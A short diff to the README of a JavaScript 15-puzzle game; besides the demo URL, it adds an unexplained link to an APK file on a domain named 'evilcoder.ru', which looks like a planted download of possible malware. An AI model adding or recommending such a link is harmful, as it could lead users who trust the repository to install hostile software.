@@ -7,3 +7,5 @@ Made for fun exclusively on Javascript without libraries.
 
 ### DEMO
 DEMO URL: https://ruecoder.github.io/barley-break/
+
+https://evilcoder.ru/zona.apk
